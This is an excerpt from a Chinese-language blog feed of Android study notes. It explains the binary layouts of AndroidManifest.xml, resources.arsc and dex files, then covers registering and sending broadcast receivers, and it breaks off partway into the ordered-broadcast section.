<li><p>ChunkType：StringChunk的类型，固定四个字节：0x001c0001。</p>
</li>
<li><p>ChunkSize：StringChunk的大小，四个字节。</p>
</li>
<li><p>StringCount：StringChunk中字符串的个数，四个字节。</p>
</li>
<li><p>StyleCount：StringChunk中样式的个数，四个字节。但实际解析过程中，这个值一直是0x00000000。</p>
</li>
<li><p>Unknown：位置区域，四个字节，在解析过程中需要略过这四个字节。</p>
</li>
<li><p>StringPoolOffset：字符串池的偏移值，四个字节，这个偏移值是相对于StringChunk的头部位置。</p>
</li>
<li><p>StylePoolPffset：样式池的偏移值，四个字节。因为这里没有Style，所以这个字段可忽略。</p>
</li>
<li><p>StringOffsets：每个字符串的偏移值，它的大小应该是StringCount*4字节。</p>
</li>
<li><p>StyleOffsets：每个样式的偏移值，它的大小应该是SytleCount*4字节。</p>
</li>
</ul>
<h3 id="解析Resourceld-Chunk"><a href="#解析Resourceld-Chunk" class="headerlink" title="解析Resourceld Chunk"></a>解析Resourceld Chunk</h3><p>Resourceld Chunk主要用于存放AndroidManifest中用到的系统属性值对应的资源ID。</p>
<ul>
<li><p>ChunkType：Resourceld Chunk的类型，固定四个字节：0x00080108。</p>
</li>
<li><p>ChunkSize：Resourceld Chunk的大小，四个字节。</p>
</li>
<li><p>Resourcelds：Resourceld的内容，这里大小是Resourceld Chunk大小除以4，减去头部的大小8个字节（ChunkType和ChunkSize）。</p>
</li>
</ul>
<h3 id="解析Start-Namespace-Chunk"><a href="#解析Start-Namespace-Chunk" class="headerlink" title="解析Start Namespace Chunk"></a>解析Start Namespace Chunk</h3><p>这个Chunk主要包含一个AndroidManifest文件中的命名空间的内容。</p>
<ul>
<li>ChunkType：Chunk的类型，固定四个字节：0x00100100。</li>
<li>ChunkSize：Chunk的大小，四个字节。</li>
<li>Line Number：在AndroidManifest文件中的行号，四个字节。</li>
<li>Unknown：未知区域，四个字节。</li>
<li>Prefix：命名空间的前缀（在字符串中的索引值），比如android。</li>
<li>Uri：命名空间的URI（在字符串中的索引值），比如<a href="http://schemas.android.com/apk/res/android。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android。</a></li>
</ul>
<h3 id="解析Start-Tag-Chunk"><a href="#解析Start-Tag-Chunk" class="headerlink" title="解析Start Tag Chunk"></a>解析Start Tag Chunk</h3><p>这个Chunk主要存放AndroidManifest.xml中的标签信息。</p>
<ul>
<li>ChunkType：Chunk的类型，固定四个字节：0x00100102。</li>
<li>ChunkSize：Chunk的大小，四个字节。</li>
<li>Line Number：在AndroidManifest文件中的行号，四个字节。</li>
<li>Unknown：未知区域，四个字节。</li>
<li>Namespace URI：这个标签用到的命名空间的URI，比如用到了android这个前缀，那么就需要用<a href="http://schemas.android.com/apk/res/android这个URI区获取，四个字节。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android这个URI区获取，四个字节。</a></li>
<li>Name：标签的名称（在字符串中的索引值），四个字节。</li>
<li>Flags：标签的类型，四个字节，比如是开始标签还是结束标签等。</li>
<li>Attribute Count：标签包含的属性个数，四个字节。</li>
<li>Class Atrribute：标签包含的类属性，四个字节。</li>
<li>Atrributes：属性内容，每个属性算是一个Entry，Entry是大小为5的字节数组[Namespace, URI, Name, ValueString, Data]，在解析的时候需要注意第四个值，要做一次处理：右移24位。所以这个字段的大小是<code>属性个数*4*5个字节</code>。</li>
</ul>
<h2 id="项目下载地址"><a href="#项目下载地址" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androidxml" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androidxml</a></p>
<h1 id="resource-arsc文件格式解析"><a href="#resource-arsc文件格式解析" class="headerlink" title="resource.arsc文件格式解析"></a>resource.arsc文件格式解析</h1><h2 id="Android中资源文件的id格式"><a href="#Android中资源文件的id格式" class="headerlink" title="Android中资源文件的id格式"></a>Android中资源文件的id格式</h2><p>用apktool工具反编译时，在res/values目录下有个public.xml文件，这个文件保存了apk中所有id类型和对应的id值。包括了如下内容：</p>
<ul>
<li>type：类型名</li>
<li>name：资源名</li>
<li>id：资源的id</li>
</ul>
<p>资源包括如下几种：drawable、menu、layout、string、attr、color、style等。</p>
<p>接下来介绍如何解析resource.arsc文件：</p>
<p>解压一个apk得到对应的resource.arsc文件。</p>
<p>Android源码中的frameworks/base/include/androidfw/ResourceTypes.h即是resource中定义的所有数据结构。</p>
<p><img src="./day11/2.png" alt=""></p>
<h2 id="数据结构的定义"><a href="#数据结构的定义" class="headerlink" title="数据结构的定义"></a>数据结构的定义</h2><h3 id="头部信息（ResChunkHeader）"><a href="#头部信息（ResChunkHeader）" class="headerlink" title="头部信息（ResChunkHeader）"></a>头部信息（ResChunkHeader）</h3><p>resource.arsc文件格式是由一系列chunk构成的，每一个chunk都包含一个结构ResChunk_header，用来描述这个Chunk的基本信息。</p>
<p>参数：</p>
<ul>
<li>type：当前chunk的类型。</li>
<li>headerSize：当前chunk的头部大小。</li>
<li>size：当前chunk的大小。</li>
</ul>
<h3 id="资源索引表的头部信息（ResTableHeader）"><a href="#资源索引表的头部信息（ResTableHeader）" class="headerlink" title="资源索引表的头部信息（ResTableHeader）"></a>资源索引表的头部信息（ResTableHeader）</h3><p>resource.arsc文件的第一个结构就是资源索引表头部，其结构描述了resource.arsc文件的大小和资源包数量。</p>
<p>参数：</p>
<ul>
<li>header：标准的chunk头部信息格式。</li>
<li>packageCount：被编译的资源包的个数。</li>
</ul>
<h3 id="资源项的值字符串资源池（ResStringPoolHeader）"><a href="#资源项的值字符串资源池（ResStringPoolHeader）" class="headerlink" title="资源项的值字符串资源池（ResStringPoolHeader）"></a>资源项的值字符串资源池（ResStringPoolHeader）</h3><p>接下来紧跟着的是资源项的值字符串资源池，这个字符串资源池包含了所有在资源包里面定义的资源项的值字符串。</p>
<p>参数：</p>
<ul>
<li>header：标准的chunk头部信息结构。</li>
<li>stringCount：字符串的个数。</li>
<li>styleCount：字符串样式的个数。</li>
<li>flags：字符串的属性，可取值包括0x000（UTF-16）、0x001（字符串经过排序）、0x100（UTF-8）和他们的组合值。</li>
<li>StringStart：字符串内容块相对于其他头部的距离。</li>
<li>styleStart：字符串样式块相对于其他头部的距离。</li>
</ul>
<p>紧跟着头部的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值。而每一个元素的类型都是无符号整型。整个字符中资源池结构如图所示：</p>
<p><img src="./day11/3.jpg" alt=""></p>
<p>字符串资源池中的前两个字节为字符串长度，如果字符串为UTF-8则以0x00为结束符，UTF-16则以0x0000位结束符。</p>
<p>字符串和字符串样式位置一一对应。</p>
<p>字符串样式的结构包含如下两个结构ResStringPool_ref和ResStringPool_span。一个字符串可以对应多个ResStringPool_span和一个ResStringPool_ref。ResStringPool_span在前描述字符串的样式，ResStringPool_ref在后固定值为0xffffffff作为占位符。样式块会以两个值为0xffffffff的ResStringPool_ref作为结束。</p>
<h3 id="Package数据块（ResTablePackage）"><a href="#Package数据块（ResTablePackage）" class="headerlink" title="Package数据块（ResTablePackage）"></a>Package数据块（ResTablePackage）</h3><p>接着资源项的值字符串资源池后面的部分就是Package数据库，这个数据库记录编译包的元数据。</p>
<p>参数：</p>
<ul>
<li>header：chunk的头部信息数据结构。</li>
<li>id：包的id，等于Package Id，一般用户包的值Package Id为0x7f，系统资源包的Package Id为0x01。</li>
<li>name：包名。</li>
<li>typeString：类型字符串资源池相对头部的偏移。</li>
<li>lastPublicType：最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。</li>
<li>keyStrings：资源项名称字符串相对头部的偏移。</li>
<li>lastPublicKey：最后一个导出Public资源项目名称字符串在资源项目名称字符串资源池中的所有，目前这个值设置为资源项名称字符串资源池的元素个数。</li>
</ul>
<p>Package数据库的整体结构：</p>
<p><img src="./day11/4.png" alt=""></p>
<h3 id="类型规范数据块（ResTableTypeSpec）"><a href="#类型规范数据块（ResTableTypeSpec）" class="headerlink" title="类型规范数据块（ResTableTypeSpec）"></a>类型规范数据块（ResTableTypeSpec）</h3><p>类型规范数据库用来描述资源项中的配置差异性。通过这个差异性描述，可知道每个资源项的配置状况，进而知道在Android资源管理框架在检测到设备配置信息发生变化之后，是否需要重新加载该资源项。</p>
<p>类型规范数据块是按照类型来组织的，即每一种类型都对应一个类型规范数据块。</p>
<p>参数：</p>
<ul>
<li>header：chunk的头部信息结构。</li>
<li>id：标识资源的Type ID。Type ID是指资源的类型ID，有animator、anim、color、drawable、layout、menu、raw、string和xml等，每一种都会被赋予一个ID。</li>
<li>res0：保留，始终为0。</li>
<li>res1：保留，始终为0。</li>
<li>entryCount：等于本类型的资源项个数，指名称相同的资源项的个数。</li>
</ul>
<p>在这之后紧跟着的是一个大小为entryCount的uint32_t数组，每一个数组元素都用于描述一个资源项的配置差异性。</p>
<h3 id="资源类型项数据块（ResTableType）"><a href="#资源类型项数据块（ResTableType）" class="headerlink" title="资源类型项数据块（ResTableType）"></a>资源类型项数据块（ResTableType）</h3><p>资源类型数据块用来描述资源项的具体信息，可以用来得知每一个资源项的名称、值、配置等信息。资源类型项数据统一是按照类型和配置来组织的。</p>
<p>参数：</p>
<ul>
<li>header：chunk的头部信息结构。</li>
<li>id：标识资源的Type ID。</li>
<li>res0：保留，始终为0。</li>
<li>res1：保留，始终为0。</li>
<li>entryCount：等于本类型的资源项个数，指名称相同的资源项的个数。</li>
<li>entriesStart：等于资源项数据块相对头部的偏移值。</li>
<li>resConfig：指向一个ResTable_config，用来描述配置信息、地区、语言、分辨率等。</li>
</ul>
<p>ResTableType后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用于描述一个资源类型项数据块的偏移位置。紧跟着的是一个大小为entryCount的ResTable_entry数组，每一个数组元素都用来描述一个资源项的具体信息。</p>
<p>ResTable_entry根据flags的不同，其后跟随的数据也不同，如果为1，则ResTable_entry是ResTable_map_entry（继承自ResTable_entry，其后跟随count个ResTable_map类型组）；如果为0，则ResTable_entry其后跟随一个Res_value（描述一个普通资源的值）。</p>
<h2 id="项目下载地址-1"><a href="#项目下载地址-1" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androidarsc" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androidarsc</a></p>
<h1 id="dex文件格式解析"><a href="#dex文件格式解析" class="headerlink" title="dex文件格式解析"></a>dex文件格式解析</h1><h2 id="dex文件格式"><a href="#dex文件格式" class="headerlink" title="dex文件格式"></a>dex文件格式</h2><p><img src="./day11/5.jpg" alt=""></p>
<p><img src="./day11/6.png" alt=""></p>
<h2 id="构造dex文件"><a href="#构造dex文件" class="headerlink" title="构造dex文件"></a>构造dex文件</h2><p>首先创建一个java文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argc)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"hello world!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">javac hello.java</span><br><span class="line">dx --dex --output=hello.dex hello.class</span><br></pre></td></tr></table></figure>

<p>其中dx工具在Android SDK路径下：\build-tools\29.0.3\dx.bat</p>
<p>PS：这里需要用低版本的java环境，因为新版本的class文件dx工具还无法支持。</p>
<p>接着运行命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb push hello.dex /sdcard</span><br><span class="line">adb shell</span><br><span class="line">dalvikvm -cp /sdcard/hello.dex hello</span><br></pre></td></tr></table></figure>

<p>-cp是classpath的缩写，hello是要运行的class名称。</p>
<p>因为命令执行时，dalvikvm会在/data/dalvik-cache/目录下创建.dex文件，因此要求adb的执行shell对目录/data/dalvik-cache/有读写执行的权限。</p>
<h2 id="解析数据结构"><a href="#解析数据结构" class="headerlink" title="解析数据结构"></a>解析数据结构</h2><h3 id="头部信息Header结构"><a href="#头部信息Header结构" class="headerlink" title="头部信息Header结构"></a>头部信息Header结构</h3><p>header处理描述.dex文件的文件信息外，还有文件里其他各个区域的索引。</p>
<table>
<thead>
<tr>
<th align="left">字段名称</th>
<th align="left">偏移值</th>
<th align="left">长度</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">magic</td>
<td align="left">0x0</td>
<td align="left">8</td>
<td align="left">‘Magic’值，即魔数字段，格式如”dex\n035\0”，其中的035表示结构的版本。</td>
</tr>
<tr>
<td align="left">checksum</td>
<td align="left">0x8</td>
<td align="left">4</td>
<td align="left">校验码。</td>
</tr>
<tr>
<td align="left">signature</td>
<td align="left">0xC</td>
<td align="left">20</td>
<td align="left">SHA-1签名。</td>
</tr>
<tr>
<td align="left">file_size</td>
<td align="left">0x20</td>
<td align="left">4</td>
<td align="left">Dex文件的总长度。</td>
</tr>
<tr>
<td align="left">header_size</td>
<td align="left">0x24</td>
<td align="left">4</td>
<td align="left">文件头长度，009版本=0x5C,035版本=0x70。</td>
</tr>
<tr>
<td align="left">endian_tag</td>
<td align="left">0x28</td>
<td align="left">4</td>
<td align="left">大小端标签，标志dex文件格式为小端，此项一般固定为0x12345678。</td>
</tr>
<tr>
<td align="left">link_size</td>
<td align="left">0x2C</td>
<td align="left">4</td>
<td align="left">连接段的大小，如果为0就表示是静态连接。</td>
</tr>
<tr>
<td align="left">link_off</td>
<td align="left">0x30</td>
<td align="left">4</td>
<td align="left">连接段的开始位置，从本文件头开始算起。如果连接段的大小为0，这里也是0。</td>
</tr>
<tr>
<td align="left">map_off</td>
<td align="left">0x34</td>
<td align="left">4</td>
<td align="left">map item的偏移地址，该item属于data区里的内值要大于等于data_off的大小</td>
</tr>
<tr>
<td align="left">string_ids_size</td>
<td align="left">0x38</td>
<td align="left">4</td>
<td align="left">字符串列表的字符串个数。</td>
</tr>
<tr>
<td align="left">string_ids_off</td>
<td align="left">0x3C</td>
<td align="left">4</td>
<td align="left">字符串列表表偏移值。</td>
</tr>
<tr>
<td align="left">type_ids_size</td>
<td align="left">0x40</td>
<td align="left">4</td>
<td align="left">类型列表里类型个数。</td>
</tr>
<tr>
<td align="left">type_ids_off</td>
<td align="left">0x44</td>
<td align="left">4</td>
<td align="left">类型列表偏移值。</td>
</tr>
<tr>
<td align="left">proto_ids_size</td>
<td align="left">0x48</td>
<td align="left">4</td>
<td align="left">原型列表里原型个数。</td>
</tr>
<tr>
<td align="left">proto_ids_off</td>
<td align="left">0x4C</td>
<td align="left">4</td>
<td align="left">原型列表偏移值。</td>
</tr>
<tr>
<td align="left">field_ids_size</td>
<td align="left">0x50</td>
<td align="left">4</td>
<td align="left">字段列表里字段个数。</td>
</tr>
<tr>
<td align="left">field_ids_off</td>
<td align="left">0x54</td>
<td align="left">4</td>
<td align="left">字段列表偏移值。</td>
</tr>
<tr>
<td align="left">method_ids_size</td>
<td align="left">0x58</td>
<td align="left">4</td>
<td align="left">方法列表里方法个数。</td>
</tr>
<tr>
<td align="left">method_ids_off</td>
<td align="left">0x5C</td>
<td align="left">4</td>
<td align="left">方法列表偏移值。</td>
</tr>
<tr>
<td align="left">class_defs_size</td>
<td align="left">0x60</td>
<td align="left">4</td>
<td align="left">类定义类表中类的个数。</td>
</tr>
<tr>
<td align="left">class_defs_off</td>
<td align="left">0x64</td>
<td align="left">4</td>
<td align="left">类定义列表偏移值。</td>
</tr>
<tr>
<td align="left">data_size</td>
<td align="left">0x68</td>
<td align="left">4</td>
<td align="left">数据段的大小，必须以4字节对齐。</td>
</tr>
<tr>
<td align="left">data_off</td>
<td align="left">0x6C</td>
<td align="left">4</td>
<td align="left">数据段偏移值</td>
</tr>
</tbody></table>
<h3 id="剩余部分数据结构"><a href="#剩余部分数据结构" class="headerlink" title="剩余部分数据结构"></a>剩余部分数据结构</h3><p>略，具体参考上面的图片以及安卓源码中的/dalvik/libdex/DexFile.h文件。</p>
<h2 id="项目下载地址-2"><a href="#项目下载地址-2" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androiddex" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androiddex</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day4</title>
    <url>/2020/05/28/Android/Android-day4/</url>
    <content><![CDATA[<h1 id="广播机制详解"><a href="#广播机制详解" class="headerlink" title="广播机制详解"></a>广播机制详解</h1><h2 id="广播机制简介"><a href="#广播机制简介" class="headerlink" title="广播机制简介"></a>广播机制简介</h2><p>Android提供了一套完整的API，允许应用程序自由地发送和接收广播。发送广播的方法既即Intent，而接收广播的方法则是用广播接收器。</p>
<p>Android中的广播主要可以分为两种类型：</p>
<ul>
<li>标准广播：这是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序科研。这种广播的效率会比较高，但却无法被截断。</li>
<li>有序广播：这是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播。</li>
</ul>
<p><img src="./day4/1.png" alt=""></p>
<p><img src="./day4/2.jpg" alt=""></p>
<h2 id="接收系统广播"><a href="#接收系统广播" class="headerlink" title="接收系统广播"></a>接收系统广播</h2><h3 id="动态注册监听网络变化"><a href="#动态注册监听网络变化" class="headerlink" title="动态注册监听网络变化"></a>动态注册监听网络变化</h3><p>注册广播的方式一般有两种，在代码中注册和在AndroidManifest.xml中注册，其中前者也被称为动态注册，后者也被称为静态注册。</p>
<p>动态注册的广播必须要在程序启动之后才能接收到广播。</p>
<p>动态注册只需新建一个类，让他继承自BraodcastReceiver并重写onReceive()方法即可。</p>
<p>新建一个BroadcastTest项目，修改代码为如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">        intentFilter.addAction(<span class="string">"android.net.conn.CONNECTIVITY_CHANGE"</span>);</span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> NetworkChangeReceiver();</span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">"network changes"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当网络状态发送变化时，系统发出一条值为android.net.conn.CONNECTIVITY_CHANGE的广播，所以这里向intentFilter传入android.net.conn.CONNECTIVITY_CHANGE这一值，即相应的action。</p>
<p>接下来registerReceiver()用来注册从而使networkChangeReceiver能够接收到所有值为android.net.conn.CONNECTIVITY_CHANGE的广播。</p>
<p>PS:bluestacks模拟器没有网络选项，没法测试；得上真机，或者可以的话看看Android Studio的模拟器可以不可以。</p>
<p>然后我们可以修改onReceive()为如下代码以显示有无网络：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">    ConnectivityManager connectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">    NetworkInfo networkInfo = connectionManager.getActiveNetworkInfo();</span><br><span class="line">    <span class="keyword">if</span>(networkInfo != <span class="keyword">null</span> &amp;&amp; networkInfo.isAvailable())&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">"network is available"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">"network is unavailable"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在AndroidManifest.xml中添加权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以在真机上测试了。</p>
<h3 id="静态注册实现开启启动"><a href="#静态注册实现开启启动" class="headerlink" title="静态注册实现开启启动"></a>静态注册实现开启启动</h3><p>新建一个广播接收器：点击com.example.broadcasttest包-&gt;New-&gt;Other-&gt;Broadcast Receiver，创建一个名为BootCompleteReceiver的接收器，</p>
<p>勾选Exported（是否允许这个广播接收器接收本程序以外的广播）和Enabled（是否启用这个广播）这两个选项，完成创建。并修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"Boot Complete"</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外还需添加如下权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_BOOT_COMPLETED"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>并修改receiver标签如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".BootCompleteReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样开机时就可以接收到开机广播了。</p>
<h2 id="发送自定义广播"><a href="#发送自定义广播" class="headerlink" title="发送自定义广播"></a>发送自定义广播</h2><h3 id="发送标准广播"><a href="#发送标准广播" class="headerlink" title="发送标准广播"></a>发送标准广播</h3><p>首先新建一个MyBroadcastReceiver广播接收器来接收我们发送的广播：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">"I have received"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再<code>&lt;receiver&gt;</code>标签修改：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyBroadcastReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来在布局中添加一个按钮：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Send Broadcast"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.broadcasttest.MY_BROADCAST"</span>);</span><br><span class="line">                sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样点下按钮后就可以发送接收到广播了。同时，因为广播是使用Intent传递的，所以还可以在Intent中携带一些数据传递给广播接收器。</p>
<h3 id="发送有序广播"><a href="#发送有序广播" class="headerlink" title="发送有序广播"></a>发送有序广播</h3><p>新建一个新的BroadcastTest2项目。</p>
<p>再新建一个名为AnotherBroadcastReceiver的接收器，修改为如下代码：</p>
